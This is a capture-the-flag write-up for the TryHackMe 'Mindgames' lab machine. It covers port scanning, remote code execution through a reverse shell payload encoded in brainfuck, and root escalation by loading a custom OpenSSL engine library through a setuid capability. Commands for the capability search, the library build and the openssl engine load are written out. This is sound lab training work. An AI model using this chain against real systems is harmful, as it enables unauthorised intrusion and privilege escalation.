Machine: Mindgames
Link: https://tryhackme.com/room/mindgames  

Connect to Tryhackme vpn and spawn the machine  

export the ip ("export IP='target IP'")  

Start with a nmap/rustscan scan ("nmap -sC -sV $IP"/"rustscan -a $IP")  


```
----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/debangshu/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.26.191:22
Open 10.10.26.191:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 22:53 IST
Initiating Ping Scan at 22:53
Scanning 10.10.26.191 [2 ports]
Completed Ping Scan at 22:53, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:53
Completed Parallel DNS resolution of 1 host. at 22:53, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:53
Scanning 10.10.26.191 [2 ports]
Discovered open port 22/tcp on 10.10.26.191
Discovered open port 80/tcp on 10.10.26.191
Completed Connect Scan at 22:53, 0.18s elapsed (2 total ports)
Nmap scan report for 10.10.26.191
Host is up, received conn-refused (0.21s latency).
Scanned at 2023-09-06 22:53:51 IST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds

```  

Open Ports: 22,80  

we didn't find anything from ssh so lets access the http port(80)  

![website](https://github.com/Debang5hu/ctf-writeups/assets/114200360/12cbe45e-6c13-4710-97cf-642639fc41e5)


from the website we find 2 code of 'brainfuck' and one section where we can execute our code.  

after decrypting the code we found the code to be of python  

![python_code](https://github.com/Debang5hu/ctf-writeups/assets/114200360/ea5bd0c1-6db7-422e-8d54-1d331e32cd1c)


so I tried to execute python code in the "Try before you buy" section but it didn't executed  

then I converted the python reverse shell payload into brainfuck and then executed.  

![python_to_brainfuck](https://github.com/Debang5hu/ctf-writeups/assets/114200360/6bddebc4-20fb-4eb3-ba7d-55b4dab2caba)  



It got RCE vulnerability and we got the shell  


```
python3 -c "import pty;pty.spawn('/bin/bash')"

```  

to get the user.txt  

```
cat /home/mindgames/user.txt 

```
![user_txt](https://github.com/Debang5hu/ctf-writeups/assets/114200360/bb11d5ed-fc9b-4b7a-902e-3bdbaf7968b1)




To get the Root Shell  
-------------------------  


let’s try "sudo -l" to see if mindgames can run sudo:  

but we don't have mindgames password  

Now let's check for capabilities

```
getcap -r / 2>/dev/null
```  

Openssl has the setuid cap.  

write an C program to exploit it  

refer to <a href="https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/"></a>  


![exploit](https://github.com/Debang5hu/ctf-writeups/assets/114200360/9acc3e67-57fc-410b-9e82-1c5a1946108d)


Now compile this c program  

```
gcc -fPIC -o filename.o -c filename.c && gcc -shared -o filename.so -lcrypto filename.o

```  

Now transfer the ".so" file to the target machine using python's http server  

then use Openssl and execute the  new lib  

```
openssl req -engine shellroot.so

```  

and boom we are ROOT  

to get the final flag  

```
cat /root/root.txt

```  

Thankyou









